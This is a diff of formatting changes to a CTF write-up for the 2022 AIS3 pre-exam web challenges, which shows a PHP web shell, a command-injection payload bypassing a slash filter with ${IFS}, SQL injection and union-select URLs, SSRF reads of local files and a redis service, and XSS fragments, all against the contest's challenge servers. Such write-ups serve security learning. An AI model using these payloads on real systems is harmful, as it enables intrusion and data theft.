@@ -14,6 +14,8 @@ This article is the write-up of 2022 AIS3 pre-exam. [AIS3](https://ais3.org/) is
 
 And I could only solve web question, so that's it :( Let's start.
 
+<!-- more -->
+
 ## Questions
 
 ### Poking Bear
@@ -56,7 +58,6 @@ Seems I am a human now, so changed it to `bear poken`.
 ![](https://i.imgur.com/prxUi8x.png)
 
 Works!
-
 
 ### Simple File Uploader
 
@@ -168,13 +169,14 @@ if (isset($_FILES['file'])) {
 ```
 
 Ok, we can bypass extension blacklist by `pHp`, and use dynamic function name to bypass second blacklist. Upload a webshell:
+
 ```php
 <?php
 $_GET['a']($_GET['b']);
 ```
 
 And executed it with:
-http://chals1.ais3.org:8988/uploads/{MY_WEB_SHELL}.pHp?a=system&b=/rUn_M3_t0_9et_fL4g
+<http://chals1.ais3.org:8988/uploads/{MY_WEB_SHELL}.pHp?a=system&b=/rUn_M3_t0_9et_fL4g>
 ![](https://i.imgur.com/I7BW3jV.png)
 
 ### The Best Login UI
@@ -284,6 +286,7 @@ Try to change `name`, but got a error:
 ![](https://i.imgur.com/J1ir0Ld.png)
 
 Than let's try another parameter. First decode the `file`:
+
 ```
 03c0ec25a3cd7de367da1ff7c5461e8d.tar.gz
 ```
@@ -355,6 +358,7 @@ Nice!
 And I tried to use `ls /` to find out flag's filename, but somehow it doesn't work :( Maybe there's a WAF or something?
 
 So I bypassed `/` with `${IFS}`:
+
 ```
 qwe'; ls `echo${IFS}${PATH}|cut${IFS}-c1-1`;echo '
 ```
@@ -424,13 +428,13 @@ Try get all cats:
 It told us hint is in the `secret_cat` emoji.
 
 But we don't have its id. So SQLi time:
-http://chals1.ais3.org:9487/api/emoji/(128006)or(id=3)
+<http://chals1.ais3.org:9487/api/emoji/(128006)or(id=3)>
 
 ![](https://i.imgur.com/1QQ7WUO.png)
 
 `FLAG is in other table`, so we need to know what kind of db is this to do more.
 
-http://chals1.ais3.org:9487/api/emoji/(12800996)union(SELECT+1,2,1,@@version,null)
+<http://chals1.ais3.org:9487/api/emoji/(12800996)union(SELECT+1,2,1,@@version,null)>
 
 Through `@@version`, we knew it's SQL Server.
 ![](https://i.imgur.com/fQnkQtk.png)
@@ -461,7 +465,8 @@ Got the flag successfully!
 
 Looks like SSRF, so let's try read source code.
 
-http://chals1.ais3.org:8763/api.php?action=view&url=file:///var/www/html/api.php
+<http://chals1.ais3.org:8763/api.php?action=view&url=file:///var/www/html/api.php>
+
 ```php=
 
 <?php
@@ -510,7 +515,9 @@ if ($action === 'view' && isset($_GET['url'])) {
     echo 'OK';
 }
 ```
+
 and `session.php`
+
 ```php=
 
 <?php
@@ -570,7 +577,7 @@ class SessionManager
 
 We found `redis` service in `session.php` line 2, so try get some info with `dict`.
 
-http://chals1.ais3.org:8763/api.php?action=view&url=dict://redis:6379/info
+<http://chals1.ais3.org:8763/api.php?action=view&url=dict://redis:6379/info>
 
 ```
 -ERR unknown subcommand 'libcurl'. Try CLIENT HELP.
@@ -841,6 +848,7 @@ fetch('/').then((r)=>r.text()).then((r)=>r.match('[a-z0-9\-]{36}')[0]).then((r)=
 ```
 
 And upload a svg with(replace `{PREV_GIF_UUID}` with first `GIF`'s uuid):
+
 ```xml
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
@@ -860,5 +868,5 @@ This time is my first time to participated a ctf seriously XD. But I need to wor
 
 ## References
 
-- https://portswigger.net/web-security/sql-injection/cheat-sheet
-- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+- <https://portswigger.net/web-security/sql-injection/cheat-sheet>
+- <https://portswigger.net/web-security/cross-site-scripting/cheat-sheet>
